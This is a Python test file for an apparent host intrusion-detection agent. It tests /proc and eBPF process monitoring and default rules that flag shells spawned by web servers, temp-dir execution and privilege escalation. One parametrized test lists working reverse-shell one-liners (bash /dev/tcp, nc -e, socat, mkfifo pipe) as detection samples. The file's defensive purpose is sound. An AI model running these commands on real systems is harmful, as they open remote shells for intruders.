"""Process monitor: /proc parsing, fork/exec diffing, eBPF record handling, default rules."""

import os

import pytest

from secagent.daemon import procfs
from secagent.daemon.bpftrace import decode_argv
from secagent.daemon.policy_engine import Policy, PolicyEngine
from secagent.daemon.process_monitor import ProcessMonitor, build_exec_event
from secagent.events import Event
from secagent.policy import DEFAULT_POLICY_PATH
from tests.conftest import requires_linux


# ------------------------------------------------------------------ fake /proc

class FakeProc:
    """Builds a minimal /proc tree: stat, status, cmdline, exe symlink, cwd symlink."""

    def __init__(self, root):
        self.root = root

    def add(self, pid, ppid, comm, exe, argv, uid=1000, euid=None, start=100):
        d = self.root / str(pid)
        d.mkdir(exist_ok=True)
        (d / "stat").write_text(f"{pid} ({comm}) S {ppid} 1 1 0 -1 4194304 0 0 0 0 0 0 0 0 20 0 1 0 "
                                f"{start} 1000 100 0\n")
        e = uid if euid is None else euid
        (d / "status").write_text(f"Name:\t{comm}\nUid:\t{uid}\t{e}\t{e}\t{e}\n")
        (d / "cmdline").write_bytes(b"\0".join(a.encode() for a in argv) + (b"\0" if argv else b""))
        (d / "comm").write_text(comm + "\n")
        for link, target in (("exe", exe), ("cwd", "/tmp")):
            p = d / link
            if p.is_symlink():
                p.unlink()
            if target:
                os.symlink(target, p)

    def remove(self, pid):
        import shutil
        shutil.rmtree(self.root / str(pid))


@pytest.fixture
def fake_proc(tmp_path):
    fp = FakeProc(tmp_path)
    fp.add(1, 0, "systemd", "/usr/lib/systemd/systemd", ["/sbin/init"], uid=0)
    fp.add(100, 1, "nginx", "/usr/sbin/nginx", ["nginx: master"], uid=0)
    fp.add(101, 100, "nginx", "/usr/sbin/nginx", ["nginx: worker"], uid=33)
    return fp


def test_parse_stat_handles_hostile_comm():
    text = "42 (a) b (c) S 7 42 42 0 -1 0 0 0 0 0 0 0 0 0 20 0 1 0 999 0 0\n"
    assert procfs.parse_stat(text) == ("a) b (c", 7, 999)
    assert procfs.parse_stat("garbage") is None


def test_parse_status_uids():
    assert procfs.parse_status_uids("Name:\tx\nUid:\t1000\t0\t0\t0\n") == (1000, 0)
    assert procfs.parse_status_uids("Name:\tx\n") is None


@requires_linux
def test_read_proc_and_ancestors(fake_proc):
    fake_proc.add(200, 101, "bash", "/usr/bin/bash", ["bash", "-i"], uid=33)
    info = procfs.read_proc(200, str(fake_proc.root))
    assert (info.comm, info.ppid, info.exe, info.argv, info.uid) == ("bash", 101, "/usr/bin/bash", ["bash", "-i"], 33)
    assert procfs.ancestors(200, proc_root=str(fake_proc.root)) == ["bash", "nginx", "nginx", "systemd"]
    assert procfs.read_proc(9999, str(fake_proc.root)) is None


@requires_linux
def test_poll_detects_new_exec_with_parent_chain(fake_proc):
    events = []
    mon = ProcessMonitor(lambda e: events.append(e), backend="proc", proc_root=str(fake_proc.root))
    mon.ignore_pids = set()
    mon.snapshot()
    assert mon.poll_once() == 0  # nothing new yet

    fake_proc.add(300, 101, "bash", "/usr/bin/bash", ["/bin/bash", "-c", "id"], uid=33)
    assert mon.poll_once() == 1
    d = events[0].data
    assert events[0].type == "process_exec"
    assert (d["child_name"], d["parent_name"], d["ppid"]) == ("bash", "nginx", 101)
    assert d["ancestors"] == ["nginx", "nginx", "systemd"]
    assert d["cmdline"] == "/bin/bash -c id"
    assert d["privilege_escalation"] is False
    assert d["backend"] == "proc"
    assert mon.poll_once() == 0  # not re-reported


@requires_linux
def test_poll_ignores_fork_without_exec_then_catches_exec_in_place(fake_proc):
    events = []
    mon = ProcessMonitor(events.append, backend="proc", proc_root=str(fake_proc.root))
    mon.ignore_pids = set()
    mon.snapshot()
    # worker forks: same exe + argv as parent -> not an exec
    fake_proc.add(400, 101, "nginx", "/usr/sbin/nginx", ["nginx: worker"], uid=33, start=500)
    assert mon.poll_once() == 0
    # ...then the forked child execs sh (same pid, same start time, new image)
    fake_proc.add(400, 101, "sh", "/usr/bin/dash", ["sh", "-c", "whoami"], uid=33, start=500)
    assert mon.poll_once() == 1
    assert events[0].data["child_name"] == "sh"


@requires_linux
def test_poll_detects_pid_reuse(fake_proc):
    events = []
    mon = ProcessMonitor(events.append, backend="proc", proc_root=str(fake_proc.root))
    mon.ignore_pids = set()
    fake_proc.add(500, 1, "cron", "/usr/sbin/cron", ["cron"], uid=0, start=10)
    mon.snapshot()
    fake_proc.remove(500)
    fake_proc.add(500, 1, "xmrig", "/tmp/xmrig", ["/tmp/xmrig"], uid=0, start=99)
    assert mon.poll_once() == 1
    assert events[0].data["exe"] == "/tmp/xmrig"


@requires_linux
def test_poll_skips_kernel_threads(fake_proc):
    events = []
    mon = ProcessMonitor(events.append, backend="proc", proc_root=str(fake_proc.root))
    mon.ignore_pids = set()
    mon.snapshot()
    fake_proc.add(600, 2, "kworker/0:1", None, [], uid=0)
    assert mon.poll_once() == 0


@requires_linux
def test_poll_privilege_escalation_flag(fake_proc):
    events = []
    mon = ProcessMonitor(events.append, backend="proc", proc_root=str(fake_proc.root))
    mon.ignore_pids = set()
    fake_proc.add(700, 1, "bash", "/usr/bin/bash", ["bash"], uid=1000)
    mon.snapshot()
    fake_proc.add(701, 700, "exploit", "/home/u/exploit", ["./exploit"], uid=1000, euid=0)
    mon.poll_once()
    d = events[0].data
    assert (d["uid"], d["euid"], d["parent_euid"], d["privilege_escalation"]) == (1000, 0, 1000, True)


# ------------------------------------------------------------------ eBPF record handling

def test_decode_argv_handles_escapes():
    assert decode_argv(r"bash\x00-c\x00echo a\x0ab\x00") == ["bash", "-c", "echo a\nb"]
    assert decode_argv("") == []


def test_bpf_records_joined_by_pid():
    events = []
    mon = ProcessMonitor(events.append, backend="ebpf")
    mon.handle_bpf_record([84242, 4242, 1, 33, 33, 33, "bash", "nginx", "/usr/bin/bash"], now=0)
    mon.handle_bpf_record([89999, 9999, 1, 0, 0, 0, "ls", "sh", "/usr/bin/ls"], now=0)  # interleaved
    assert events == []
    mon.handle_bpf_record([84242, r"bash\x00-i\x00"], now=0.01)
    assert len(events) == 1
    d = events[0].data
    assert (d["pid"], d["child_name"], d["parent_name"], d["cmdline"]) == (4242, "bash", "nginx", "bash -i")
    assert d["backend"] == "ebpf"


def test_bpf_header_without_argv_is_flushed_after_ttl():
    events = []
    mon = ProcessMonitor(events.append, backend="ebpf")
    mon.handle_bpf_record([84243, 4243, 1, 1000, 0, 1000, "pwn", "bash", "/tmp/pwn"], now=0)
    mon.flush_pending(now=0.5)
    assert events == []
    mon.flush_pending(now=2.0)
    assert len(events) == 1
    d = events[0].data
    assert d["exe"] == "/tmp/pwn" and d["privilege_escalation"] is True
    assert d["cmdline_truncated"] is True


def test_bpf_skips_tasks_outside_our_pid_namespace():
    events = []
    mon = ProcessMonitor(events.append, backend="ebpf")
    mon.handle_bpf_record([777, 0, 0, 0, 0, 0, "containerd", "systemd", "/usr/bin/containerd"], now=0)
    mon.handle_bpf_record([777, r"containerd\x00"], now=0)
    assert events == [] and mon.ns_invisible == 1


def test_bpf_ignores_own_helper_pid():
    events = []
    mon = ProcessMonitor(events.append, backend="ebpf")
    mon.ignore_pids = {555}
    mon.handle_bpf_record([8555, 555, 1, 0, 0, 0, "bpftrace", "python3", "/usr/bin/bpftrace"], now=0)
    mon.handle_bpf_record([8555, r"bpftrace\x00"], now=0)
    assert events == []


# ------------------------------------------------------------------ default policy rules

@pytest.fixture(scope="module")
def default_engine():
    return PolicyEngine(Policy.from_file(DEFAULT_POLICY_PATH))


def fire(engine, **kw):
    base = dict(pid=10, ppid=9, uid=1000, euid=1000, parent_euid=1000, child_name="ls",
                parent_name="bash", exe="/usr/bin/ls", argv=["ls"], backend="proc")
    base.update(kw)
    data = build_exec_event(**base)
    return {a.rule_id for a in engine.evaluate(Event("process_exec", "test", data))}


def test_default_policy_loads(default_engine):
    assert len(default_engine.rules) >= 5


def test_rule_webserver_shell(default_engine):
    assert "suspicious-shell-from-webserver" in fire(default_engine, parent_name="nginx", child_name="bash")
    assert "suspicious-shell-from-webserver" in fire(default_engine, parent_name="apache2", child_name="nc")
    assert "suspicious-shell-from-webserver" not in fire(default_engine, parent_name="sshd", child_name="bash")
    assert "suspicious-shell-from-webserver" not in fire(default_engine, parent_name="nginx", child_name="nginx")


def test_rule_tmp_exec(default_engine):
    assert "exec-from-temp-dir" in fire(default_engine, exe="/tmp/x")
    assert "exec-from-temp-dir" in fire(default_engine, exe="/dev/shm/.hidden/miner")
    assert "exec-from-temp-dir" not in fire(default_engine, exe="/usr/bin/tmpreaper")


def test_rule_privilege_escalation(default_engine):
    assert "privilege-escalation-to-root" in fire(default_engine, child_name="exploit", euid=0)
    # sudo is setuid-root by design -> allowlisted
    assert "privilege-escalation-to-root" not in fire(default_engine, child_name="sudo", euid=0)
    # root parent -> not an escalation
    assert "privilege-escalation-to-root" not in fire(default_engine, child_name="x", euid=0, parent_euid=0)


@pytest.mark.parametrize("cmd,hit", [
    ("bash -c bash -i >& /dev/tcp/10.0.0.5/4444 0>&1", True),
    ("nc -e /bin/sh 10.0.0.5 4444", True),
    ("ncat 10.0.0.5 4444 -e /bin/bash", True),
    ("socat tcp:10.0.0.5:4444 exec:/bin/sh", True),
    ("rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 10.0.0.5 4444 > /tmp/f", True),
    ("python3 -c import socket,subprocess,os;s=socket.socket();os.dup2(s.fileno(),0)", True),
    ("ls -la /dev/tty", False),
    ("nc -zv example.com 443", False),
])
def test_rule_reverse_shell(default_engine, cmd, hit):
    argv = cmd.split()
    assert ("reverse-shell-cmdline" in fire(default_engine, argv=argv, child_name=argv[0])) is hit
